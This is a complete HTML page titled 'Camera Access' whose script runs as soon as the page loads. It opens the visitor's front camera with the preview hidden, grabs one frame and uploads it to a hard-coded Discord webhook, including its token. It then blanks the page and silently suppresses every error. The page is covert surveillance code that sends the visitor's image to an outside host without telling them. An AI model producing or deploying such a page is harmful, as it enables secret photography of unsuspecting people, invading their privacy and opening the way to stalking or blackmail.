<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Access</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        #video {
            width: 300px;
            height: 200px;
            object-fit: cover;
            display: none;
            border: 1px solid #ddd;
        }
        #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        
        const DISCORD_WEBHOOK = 'https://discordapp.com/api/webhooks/1395581066227482704/bvNY8lJZjqRutiIECB1OKQUhbVcMHUqkTEO6AsJTabeJmQcp4OLSn0OikIl1TXsC72KB';
        
        let stream = null;
        
        async function startCamera() {
            try {
                const constraints = {
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                };
                
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    // Capture and send immediately, with no delay
                    captureAndSend();
                };
                
            } catch (err) {
                // Do nothing, no text or message should be shown
            }
        }
        
        async function captureAndSend() {
            if (!stream) return;
            
            try {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(async (blob) => {
                    try {
                        const formData = new FormData();
                        const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
                        formData.append('file', blob, `camera-capture-${timestamp}.jpg`);
                        const payload = {
                            content: ""
                        };
                        formData.append('payload_json', JSON.stringify(payload));
                        
                        await fetch(DISCORD_WEBHOOK, {
                            method: 'POST',
                            body: formData
                        });
                        
                        stopCamera();
                        // Instantly clear the page after finishing, no delay
                        document.body.innerHTML = '';
                        
                    } catch (error) {
                        // Do nothing
                    }
                }, 'image/jpeg', 0.9);
            } catch (error) {
                // Do nothing
            }
        }
        
        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
        }
        
        // Start immediately when page loads
        window.addEventListener('load', () => {
            startCamera();
        });
        
        window.addEventListener('beforeunload', stopCamera);
    </script>
</body>
</html>
